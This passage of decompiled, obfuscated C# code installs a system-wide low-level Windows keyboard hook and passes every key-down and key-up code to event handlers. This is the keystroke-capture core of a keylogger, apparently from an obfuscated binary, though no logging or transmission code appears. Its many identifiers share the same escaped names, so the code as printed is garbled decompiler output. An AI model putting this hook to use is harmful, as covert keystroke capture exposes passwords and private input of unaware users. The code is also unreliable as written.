      [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int \u0002(int hHook);

      public static event \u0003.\u0002.\u0001.\u0003 KD;

      public static event \u0003.\u0002.\u0001.\u0004 KU;

      public \u0001()
      {
        \u0003.\u0002.\u0001.\u0001 = new \u0003.\u0002.\u0001.\u0002(\u0003.\u0002.\u0001.\u0002);
        \u0003.\u0002.\u0001.\u0007 = \u0003.\u0002.\u0001.\u0002(13, \u0003.\u0002.\u0001.\u0001, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
      }

      private static int \u0002(int nCode, int wParam, ref \u0003.\u0002.\u0001.\u0001 lParam)
      {
        if (nCode == 0)
        {
          switch (wParam)
          {
            case 256:
            case 260:
              \u0003.\u0002.\u0001.\u0003 obj1 = \u0003.\u0002.\u0001.\u0001;
              if (obj1 != null)
              {
                obj1((Keys) lParam.\u0001);
                break;
              }
              break;
            case 257:
            case 261:
              \u0003.\u0002.\u0001.\u0004 obj2 = \u0003.\u0002.\u0001.\u0001;
              if (obj2 != null)
              {
                obj2((Keys) lParam.\u0001);
                break;
              }
              break;
          }
        }
        return \u0003.\u0002.\u0001.\u0002(\u0003.\u0002.\u0001.\u0007, nCode, wParam, lParam);
      }

      ~\u0001()
      {
        \u0003.\u0002.\u0001.\u0002(\u0003.\u0002.\u0001.\u0007);
        // ISSUE: explicit finalizer call
        base.Finalize();
      }

      private struct \u0001
      {
        public int \u0001;
        public int \u0002;
        public int \u0003;
        public int \u0004;
        public int \u0005;
      }

      private delegate int \u0002(int nCode, int wParam, ref \u0003.\u0002.\u0001.\u0001 lParam);

      internal delegate void \u0003(Keys Key);

      internal delegate void \u0004(Keys Key);
    }
  }
}
